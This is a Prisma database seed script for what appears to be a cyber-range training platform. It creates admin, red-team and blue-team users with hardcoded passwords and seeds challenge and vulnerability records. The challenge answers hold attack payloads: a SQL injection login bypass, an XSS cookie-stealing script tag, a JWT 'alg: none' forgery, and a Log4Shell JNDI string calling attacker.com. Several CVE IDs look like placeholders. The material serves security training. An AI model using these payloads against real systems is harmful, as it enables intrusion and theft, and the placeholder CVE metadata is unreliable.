import { PrismaClient, Role, Severity } from '@prisma/client';
import bcrypt from 'bcryptjs';

const prisma = new PrismaClient();

async function main() {
  const adminPassword = await bcrypt.hash('Admin@123!', 12);
  const userPassword = await bcrypt.hash('User@123!', 12);

  await prisma.user.upsert({
    where: { email: 'admin@cyberrange.io' },
    update: {},
    create: {
      email: 'admin@cyberrange.io',
      username: 'admin',
      password: adminPassword,
      role: Role.ADMIN,
      securityScore: 9800,
    },
  });

  await prisma.user.upsert({
    where: { email: 'redteam@cyberrange.io' },
    update: {},
    create: {
      email: 'redteam@cyberrange.io',
      username: 'red_operator',
      password: userPassword,
      role: Role.RED_TEAM,
      securityScore: 7200,
    },
  });

  await prisma.user.upsert({
    where: { email: 'blueteam@cyberrange.io' },
    update: {},
    create: {
      email: 'blueteam@cyberrange.io',
      username: 'blue_defender',
      password: userPassword,
      role: Role.BLUE_TEAM,
      securityScore: 6800,
    },
  });

  const challenges = [
    { title: 'SQL Injection Basics', category: 'Web Security', difficulty: 'Easy', points: 100, description: 'Learn to identify and exploit SQL injection vulnerabilities.', content: 'Bypass the login form using SQL injection.', solution: "' OR '1'='1" },
    { title: 'XSS Reflected Attack', category: 'Web Security', difficulty: 'Easy', points: 150, description: 'Craft a reflected XSS payload to steal cookies.', content: 'Inject a script tag into the search parameter.', solution: '<script>alert(document.cookie)</script>' },
    { title: 'Buffer Overflow 101', category: 'Binary Exploitation', difficulty: 'Medium', points: 300, description: 'Overflow a stack buffer to gain code execution.', content: 'Exploit the vulnerable C program to get a shell.', solution: 'python3 exploit.py' },
    { title: 'JWT Token Forgery', category: 'Authentication', difficulty: 'Medium', points: 250, description: 'Forge a JWT token by exploiting algorithm confusion.', content: 'Change the algorithm to none and forge admin claims.', solution: 'alg: none' },
    { title: 'Log4Shell Exploitation', category: 'CVE Exploits', difficulty: 'Hard', points: 500, description: 'Exploit Log4Shell (CVE-2021-44228) in a vulnerable app.', content: 'Use JNDI lookup to achieve RCE.', solution: '${jndi:ldap://attacker.com/exploit}' },
    { title: 'CSRF Token Bypass', category: 'Web Security', difficulty: 'Medium', points: 200, description: 'Bypass CSRF protection using various techniques.', content: 'Craft a malicious HTML page to perform unauthorized actions.', solution: 'SameSite cookie bypass' },
  ];

  for (const ch of challenges) {
    const id = ch.title.replace(/\s+/g, '-').toLowerCase();
    const existing = await prisma.challenge.findUnique({ where: { id } });
    if (!existing) {
      await prisma.challenge.create({ data: { ...ch, id } });
    }
  }

  const vulnerabilities = [
    { name: 'SQL Injection', cveId: 'CVE-2023-1234', severity: Severity.CRITICAL, cvssScore: 9.8, category: 'Injection', description: 'Unsanitized SQL input allows DB manipulation.', solution: 'Use parameterized queries and ORM.' },
    { name: 'Cross-Site Scripting', cveId: 'CVE-2023-5678', severity: Severity.HIGH, cvssScore: 7.5, category: 'XSS', description: 'Reflected XSS in search parameter.', solution: 'Encode output and use CSP headers.' },
    { name: 'Broken Authentication', cveId: 'CVE-2023-9012', severity: Severity.HIGH, cvssScore: 8.1, category: 'Authentication', description: 'Weak session management allows hijacking.', solution: 'Implement strong session tokens and MFA.' },
    { name: 'IDOR', cveId: 'CVE-2023-3456', severity: Severity.MEDIUM, cvssScore: 6.5, category: 'Access Control', description: 'Direct object references expose other users data.', solution: 'Implement proper authorization checks.' },
    { name: 'Log4Shell', cveId: 'CVE-2021-44228', severity: Severity.CRITICAL, cvssScore: 10.0, category: 'RCE', description: 'JNDI injection in Log4j allows remote code execution.', solution: 'Upgrade Log4j to 2.17.1 or later.' },
  ];

  for (const vuln of vulnerabilities) {
    await prisma.vulnerability.upsert({
      where: { cveId: vuln.cveId },
      update: {},
      create: vuln,
    });
  }

  console.log('✅ Database seeded successfully');
}

main().catch(console.error).finally(() => prisma.$disconnect());
